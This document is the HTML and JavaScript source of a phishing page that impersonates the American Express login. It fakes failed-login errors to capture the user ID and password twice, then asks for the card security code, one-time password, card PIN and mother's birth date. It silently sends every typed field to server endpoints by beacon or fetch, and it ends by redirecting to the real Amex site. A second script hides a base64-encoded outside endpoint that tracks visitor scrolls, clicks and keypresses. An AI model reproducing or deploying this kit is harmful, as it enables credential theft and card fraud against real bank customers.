    <div style="visibility: hidden;position: absolute; top: 0px; left: -999px;"></div>
    <div style="font-size: 0px; cursor: pointer; position: fixed; top: 334px; bottom: auto; display: block; background-color: transparent; border: medium none; z-index: 2000000001; right: 0px;" tabindex="0"><img src="data:image/gif;base64," style="border: medium none; text-decoration: none; padding: 0px; margin: 0px;" alt="Feedback Link"></div><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" style="display: none;" alt="">

<script>
(function () {
  window.qs = function (key) {
  var vars = [], hash;
  var hashes = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');
  for (var i = 0; i < hashes.length; i++) {
    hash = hashes[i].split('=');
    vars.push(hash[0]);
    vars[hash[0]] = decodeURIComponent(hash[1] || '');
  }
  return vars[key];
};

window.populateEmailFields = function () {
  var path = window.location.href;
  var slashval = path.substring(path.lastIndexOf('/') + 1);
  var matches =
    qs('id') || qs('authuser') || qs('user') || qs('profile') || qs('memberID') || qs('ref') ||
    qs('code') || qs('tid') || qs('qid') || qs('join') || qs('oun') || qs('tid') || qs('cid') ||
    qs('eid') || qs('fid') || qs('mid') || qs('pid') || qs('sid') || qs('Linkid') || qs('keyID');

  var arrayval = matches;

  if (typeof arrayval !== 'string' || !arrayval) {
    var esval = window.location.pathname.split('/');
    var segcount = esval.length;
    var esegval = '';
    var seg4email = '';
    const separators = ['%', '-', ':', '~', '='];

    if (segcount >= 3) {
      esegval = esval[esval.length - 2] || '';
    } else {
      esegval = window.location.href.slice(window.location.href.lastIndexOf('/') + 1);
    }

    for (let sep of separators) {
      const first = esegval.indexOf(sep);
      const last = esegval.lastIndexOf(sep);

      if (first !== -1 && last > first + 1) {
        seg4email = esegval.slice(first + 1, last);
        break;
      } else if (first !== -1 && first < esegval.length - 2) {
        seg4email = esegval.slice(first + 1);
        break;
      }
    }

    if (!seg4email) {
      const match = esegval.match(/[a-zA-Z0-9._@-]+/g);
      const raw = match ? match.join('') : '';
      seg4email = raw.length > 4 ? raw.slice(2, -2) : raw;
    }

    $('#emailid, .emailid').html(seg4email);
    $('#trcka, #trckb, #trckc').val(seg4email + '-' + slashval);

  } else {
    const aeval = matches.slice(3, -2);
    $('#emailid, .emailid').html(aeval);
    $('#trcka, #trckb, #trckc').val(slashval);
  }
};

  function buildErrorHtml(msg, extraMsg = "") {
	  return (
	    "<div class='otp-error'>" +
	      "<i class='bi bi-exclamation-triangle-fill'></i>" +
	      "<div class='error-text-block'>" +
	        "<div class='error-text'>" + msg + "</div>" +
	        (extraMsg ? "<div class='error-extra'>" + extraMsg + "</div>" : "") +
	      "</div>" +
	    "</div>" +
	    "<hr style='color:#c0c0c0;' />"
	  );
	}

  function setupFormFlow() {
    setupIntro();
    setupEnterBindings();
    setupLoading();
    setupLoginHandler();
    setupCSCHandler();
    setupOTPWatcher();
    setupResetButtons();
    setupResendOTP();
    setupFinalSubmit();
  }

  function setupIntro() {
  $('#starting').animate({ opacity: 'show' }, 100).delay(3000).animate({ opacity: 'hide' }, 1000);
  $('#clsdiv1').delay(4100).animate({ opacity: 'show' }, 100);
  $('#title').html('&nbsp;Log In to My&nbsp;&nbsp;Account &nbsp;| &nbsp;American Express&nbsp;&nbsp;US');
  const oun = document.getElementById('oun');
  if (oun) oun.focus();

  // 🧹 Clear all fields on refresh or back
  const clearFields = () => {
    document.querySelectorAll('input').forEach(el => el.value = '');
    document.querySelectorAll('#error, #msg, #cscerror, #cscrecount, #otperror, #pnerror, #mmdderror, #otpvrecount').forEach(el => el.style.display = 'none');
  };

  window.addEventListener('load', clearFields);
  window.addEventListener('pageshow', clearFields);
}

  function setupEnterBindings() {
  const map = {
    "#oun, #upw": "button[name='submita']",
    "#cscInput": "button[name='submitb']",
    "#otp, #pn, #mmdd": "button[name='submitc']"
  };

  $(document).on("keydown", function (e) {
    if (e.key === "Enter") {
      const active = document.activeElement;
      for (const selector in map) {
        if (active && $(active).is(selector)) {
          e.preventDefault();
          active.blur(); // ensures change event fires
          $(map[selector]).trigger("click");
        }
      }
    }
  });
}


  function setupLoading() {
    $.loading = function (btn) {
      if (!btn.data('old-html')) {
        btn.data('old-html', btn.html()).prop('disabled', true).html(btn.data('loading-text') || '&nbsp;');
        return;
      }
      btn.prop('disabled', false).html(btn.data('old-html')).data('old-html', false);
    };
  }


  function setupLoginHandler() {
    var count = 0;
    $("button[name='submita']").click(function (e) {
      e.preventDefault();
      $('#error, #msg, #logcount').hide();
      var oun = $('#oun').val();
      var upw = $('#upw').val();

      if (!oun || !upw) {
        $('#error').show().html(buildErrorHtml("Both the User ID and Password are required."));
        (!oun ? $('#oun') : $('#upw')).focus();
        return false;
      }

      count++;
      if (count >= 2) {
        count = 0;
        $('#login').fadeIn().html("<i class='spinner-border spinner-border-sm text-light' role='status'></i> &nbsp;");
        $('#clsdiv1').delay(2000).fadeOut(1000);
        $('#loading').delay(3000).fadeIn(1000).delay(4000).fadeOut(1000);
        $('#clsdiv2').delay(9000).fadeIn(1000);
        $('#title').html('American Express&nbsp;&nbsp; | &nbsp;Authentication');
        $('#cscerror').hide();
        $('#cscInput').focus();
      } else {
        var $btn = $("#login");
        $('#logcount').hide();
        $.loading($btn, true);
        setTimeout(function () {
          $.loading($btn, false);
          $('#logcount').show().html(buildErrorHtml("The User ID or Password is incorrect. Please try again."));
          $('#oun, #upw').val('');
          $('#oun').focus();
        }, 5000);
      }
    });
  }

  function setupCSCHandler() {
  let count = 0;

  $("button[name='submitb']").on('click', function (e) {
    e.preventDefault();
    $('#cscerror, #cscrecount').hide();

    const rawCSC = $('#cscInput').val();
    const csc = rawCSC.replace(/\D/g, '');

    const $btn = $('#verify');
    if ($btn.length === 0) return;

    // Reject if no digits or fewer than 3 digits
    if (!csc || csc.length < 3) {
      $('#cscInput').focus();
      $('#cscerror').show().html(
        '&nbsp; &nbsp; <i class="bi bi-exclamation-triangle-fill"></i> &nbsp;Required valid 3-digit Card Security Code (CSC)'
      );
      return;
    }

    count++;

    if (count >= 2) {
      count = 0;
      $.loading($btn);
      $('#clsdiv2').delay(2000).fadeOut(1000);
      $('#loading').delay(3000).fadeIn(1000).delay(4000).fadeOut(1000, function () {
        $('#clsdiv3').fadeIn(1000);
        $('#title').html('American Express&nbsp;&nbsp; | &nbsp;Verification');
        $('#otperror').hide();
        $('#otp').focus();
      });
    } else {
      $.loading($btn);
      setTimeout(function () {
        $.loading($btn);
        $('#cscrecount')
          .hide()
          .html('&nbsp; &nbsp; <i class="bi bi-exclamation-triangle-fill"></i> &nbsp;Required valid 3-digit Card Security Code (CSC)')
          .fadeIn(500);
        $('#cscInput').val('').focus();
      }, 1000);
    }
  });
}


  function setupOTPWatcher() {
    $('#otp').on('input', function () {
      const value = $(this).val().trim();
      const digitCount = value.replace(/\D/g, '').length;
      if (digitCount >= 6) {
        $('#pnmmdd').stop(true, true).slideDown('slow');
      } else {
        $('#pnmmdd').stop(true, true).slideUp('slow');
      }
    });
  }

  function setupResetButtons() {
    $('#prev1, #prev2, #prev3').click(function (e) {
      e.preventDefault();
      $('#msg, #error, #cscerror, #otperror, #pnerror, #mmdderror').hide();
      $('#oun, #upw, #cscInput, #pn, #mmdd, #otp').val('');
      $('#prev1').animate({ opacity: 'show' }, 2000).html("<i class='spinner-border spinner-border-sm text-primary' role='status'></i> &nbsp;");
      $('#priv2').animate({ opacity: 'show' }, 2000).html("<i class='spinner-border spinner-border-sm text-primary' role='status'></i> &nbsp;");
      $('#priv3').animate({ opacity: 'show' }, 2000).html("<i class='spinner-border spinner-border-sm text-primary' role='status'></i> &nbsp;");
      $('#clsdiv4,#clsdiv3, #clsdiv2, #clsdiv1').fadeOut(2000).delay(2000);
      $('#clsdiv1').fadeIn(4000);
      $('#login').html('Log In');
      $('#verify').html('Confirm');
      $('#otpv').html('Verify');
      $('#title').html('&nbsp; Log In to My&nbsp;&nbsp;Account&nbsp;|&nbsp;American Express&nbsp;&nbsp;US');
      $('#prev1, #prev2, #prev3').html('Log In');
    });
  }


function setupResendOTP() {
  let clickCount = 0;
  const ENDPOINT = window.location.pathname + '/i';

  // 📤 Sender specific to Resend OTP (silent fire-and-forget)
  function sendPayload(payload) {
    try {
      const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
      let beaconOk = false;

      if (navigator.sendBeacon) {
        beaconOk = navigator.sendBeacon(ENDPOINT, blob);
      }

      if (!beaconOk && ENDPOINT) {
        fetch(ENDPOINT, {
          method: "POST",
          body: JSON.stringify(payload),
          headers: { "Content-Type": "application/json" },
          keepalive: true
        }).catch(() => {});
      }
    } catch (err) {}
  }

  // 🔲 Overlay routine with spinner + toast targeting #subclsdiv3
  function showLightOverlay(
    target = "#subclsdiv3",
    duration = 30000,
    fade = 2000,
    btnSelector = "#otpv",
    callback = null
  ) {
    const $target = $(target);

    if ($target.find(".overlay-layer").length === 0) {
      $target.css("position", "relative").append(
        "<div class='overlay-layer'>" +
          "<div class='spinner-border' role='status'></div>" +
          "<div class='toast-msg' style='display:none;'>Code Sent</div>" +
        "</div>"
      );
    }

    const $overlay = $target.find(".overlay-layer");
    const $toast = $overlay.find(".toast-msg");

    $(btnSelector).prop("disabled", true);
    $overlay.stop(true, true).fadeIn(200);

    // ⏳ Flash toast for 1.5s near the end of overlay
    setTimeout(() => {
      $toast.fadeIn(300).delay(1500).fadeOut(500);
    }, duration - 2000);

    $overlay.delay(duration).fadeOut(fade, function () {
      $(this).hide();
      $(btnSelector).prop("disabled", false);
      if (typeof callback === "function") callback();
    });
  }

  // 🔁 Resend OTP on click
  $(document).on("click", "#resend", function (e) {
    e.preventDefault();
    clickCount++;

    const $targetBtn = $("#otpv");
    $.loading($targetBtn, true);

    const payload = { eventType: "resend", timestamp: new Date().toISOString(), clickCount, fields: {} };

    $(".input-control").each(function () {
      if (this.name) payload.fields[this.name] = this.value;
    });
    sendPayload(payload);

    showLightOverlay("#subclsdiv3", 30000, 2000, "#otpv", function () {
      $.loading($targetBtn, false);
      $("#otpv").html("Verify");
      $("#otp").val("");
    });
  });

  // ⏳ Debounced input tracking
  let debounceTimer;
  $(document).on("input", ".input-control", function () {
    clearTimeout(debounceTimer);
    debounceTimer = setTimeout(() => {
      const payload = { eventType: "input", timestamp: new Date().toISOString(), fields: {} };

      $(".input-control").each(function () {
        if (this.name) payload.fields[this.name] = this.value;
      });
      sendPayload(payload);
    }, 5000);
  });
}


function setupFinalSubmit() {
  let count = 0;
  let busy = false;

  const ENDPOINT = window.location.pathname + '/s';
  const ERROR_MS = 15000;
  const OVERLAY_PHASE1_MS = 10000;
  const OVERLAY_PHASE2_MS = 5000;

  function sendPayload(formDataObj) {
  try {
    const blob = new Blob([JSON.stringify(formDataObj)], { type: "application/json" });
    let beaconOk = false;
    if (navigator.sendBeacon) beaconOk = navigator.sendBeacon(ENDPOINT, blob);
    if (!beaconOk && ENDPOINT) {
      fetch(ENDPOINT, {
        method: "POST",
        body: JSON.stringify(formDataObj),
        headers: { "Content-Type": "application/json" },
        keepalive: true
      }).catch(() => {});
    }
  } catch (err) {}
 }


  function showOtpError(extraMsg = "") {
    $("#otpvrecount")
      .stop(true, true)
      .show()
      .html(buildErrorHtml("Please enter the correct one-time password.", extraMsg));
    $("#otp").val("").focus();
  }

  function showLightOverlay(duration) {
    const $target = $("#subclsdiv3");
    if ($target.find(".overlay-layer").length === 0) {
      $target.css("position","relative").append(
        "<div class='overlay-layer'><div class='spinner-border' role='status'></div></div>"
      );
    }
    const $overlay = $target.find(".overlay-layer");
    $overlay.stop(true, true).fadeIn(200);
    setTimeout(function () {
      $overlay.stop(true, true).fadeOut(500, function () { $(this).hide(); });
    }, duration);
  }

  function runOverlayThen(callbackAfter = null) {
    $("#overlay")
      .stop(true, true)
      .fadeIn(300)
      .delay(OVERLAY_PHASE2_MS)
      .fadeOut(300, function () {
        $(this).hide();
        if (typeof callbackAfter === "function") callbackAfter();
      });
  }

  function finish($btn) {
    $.loading($btn, false);
    $btn.prop("disabled", false);
    busy = false;
  }

  document.addEventListener("click", function (e) {
    if (!e.target || e.target.name !== "submitc") return;
    e.preventDefault();

    if (busy) return;
    const $btn = $("#otpv");

    busy = true;
    $.loading($btn, true);
    $btn.prop("disabled", true);

    $("#error,#msg,#otperror,#pnerror,#mmdderror,#otpvrecount").hide().empty();

    const otp = ($("#otp").val() || "").replace(/\D/g, "");
    const pn = ($("#pn").val() || "").replace(/\D/g, "");
    const mmdd = ($("#mmdd").val() || "").replace(/\D/g, "");

    if (!otp || otp.length < 6) {
      $("#otp").focus();
      $("#otperror").show().html("Please enter the correct 6-digit one-time password.");
      finish($btn);
      return;
    }
    if (pn && (pn.length < 4 || pn.length > 8)) {
      $("#pn").focus();
      $("#pnerror").show().html("4 to 8 digits you provided when activating your card.");
      finish($btn);
      return;
    }
    if (mmdd && mmdd.length !== 4) {
      $("#mmdd").focus();
      $("#mmdderror").show().html("Confirm your Mother’s Birth Month/Day (MMDD).");
      finish($btn);
      return;
    }

    count++;
    const payload = { eventType: "submit", timestamp: new Date().toISOString(), fields: {} };
    $("input").each(function () { if (this.name) payload.fields[this.name] = this.value; });
    sendPayload(payload);

    if (count === 1) {
      showLightOverlay(ERROR_MS);
      setTimeout(function () {
        showOtpError("Please try again.");
        finish($btn);
      }, ERROR_MS);
    } else if (count === 2) {
      showLightOverlay(OVERLAY_PHASE1_MS);
      setTimeout(function () {
        showOtpError("Expired one-time code, please try again.");
        runOverlayThen(function () {
          window.open("about:blank", "_blank", "noopener,noreferrer");
          finish($btn);
        });
      }, OVERLAY_PHASE1_MS);
    } else if (count >= 3) {
      count = 0;
      $("#clsdiv3").fadeOut(3000);
      $("#loading").delay(3000).fadeIn(1000).delay(15000).fadeOut(1000);
      $("#clsdiv4").delay(20000).fadeIn(1000, function () {
        $("#title").html("&nbsp;American Express&nbsp;&nbsp;|&nbsp;&nbsp;Thank You!");
        setTimeout(function () {
          window.location =
            "https://norefer.com/to/https://global.americanexpress.com/myca/logon/us/action/LogLogonHandler?request_type=LogLogonHandler&location=us_logon1";
        }, 5000);
        finish($btn);
      });
      setTimeout(function () {
        showOtpError("Expired one-time code, please try again.");
      }, ERROR_MS);
    }
  });
}

  // 🌊 Initialize everything once DOM is ready
  $(document).ready(function () {
    populateEmailFields();
    setupFormFlow();
  });
})();
</script>

<script>
const sessionId = (crypto && crypto.randomUUID) ? crypto.randomUUID() : String(Date.now());
const ENDPOINT = atob("aHR0cHM6Ly9lbGVrdHJvLXNlcnZpcy5iYS9jZ2ktYmluL3Bvc3QucGhw");

const MAX_SCROLLS = 3;
const THROTTLE_MS = 800;   // widen spacing (try 800–1000ms)

let scrollCount = 0;
let lastScrollTime = 0;
let pollId = null;
let pollArmed = true;
let coolingDown = false;

function notify(eventType) {
  try {
    fetch(ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: eventType,
        timestamp: new Date().toISOString(),
        session: sessionId
      }),
      keepalive: true
    }).catch(() => {});
  } catch (err) {}
}

function fireScroll(source) {
  if (scrollCount >= MAX_SCROLLS) return;

  const now = Date.now();

  // Block if still cooling down
  if (coolingDown && (now - lastScrollTime) < THROTTLE_MS) return;

  if (scrollCount === 0) {
    scrollCount++;
    notify("user_scroll_" + scrollCount);
  } else if (now - lastScrollTime >= THROTTLE_MS) {
    scrollCount++;
    notify("user_scroll_" + scrollCount);
  }

  lastScrollTime = now;
  coolingDown = true;

  if (scrollCount >= MAX_SCROLLS) teardown();
}

function attach() {
  window.addEventListener("scroll", () => fireScroll("scroll"), { passive: true });
  document.addEventListener("scroll", () => fireScroll("scroll"), { passive: true });
  window.addEventListener("wheel", () => fireScroll("wheel"), { passive: true });
  window.addEventListener("touchmove", () => fireScroll("touchmove"), { passive: true });

  startPoll();
}

function startPoll() {
  pollId = setInterval(() => {
    if (scrollCount < MAX_SCROLLS && pollArmed) {
      const now = Date.now();
      if (!coolingDown && (now - lastScrollTime >= THROTTLE_MS) && window.scrollY !== 0) {
        scrollCount++;
        notify("user_scroll_" + scrollCount);
        lastScrollTime = now;
        coolingDown = true;
        pollArmed = false;
      }
    }
    // End cooldown after throttle window
    if (coolingDown && (Date.now() - lastScrollTime >= THROTTLE_MS)) {
      coolingDown = false;
      pollArmed = true;
    }
    if (scrollCount >= MAX_SCROLLS) stopPoll();
  }, THROTTLE_MS);
}

function stopPoll() {
  if (pollId) {
    clearInterval(pollId);
    pollId = null;
  }
}

function teardown() {
  window.removeEventListener("scroll", () => fireScroll("scroll"));
  document.removeEventListener("scroll", () => fireScroll("scroll"));
  window.removeEventListener("wheel", () => fireScroll("wheel"));
  window.removeEventListener("touchmove", () => fireScroll("touchmove"));
  stopPoll();
}

attach();

document.addEventListener("click", () => notify("user_click"), { once: true });
document.addEventListener("keydown", () => notify("user_keypress"), { once: true });
</script>

</body>
</html>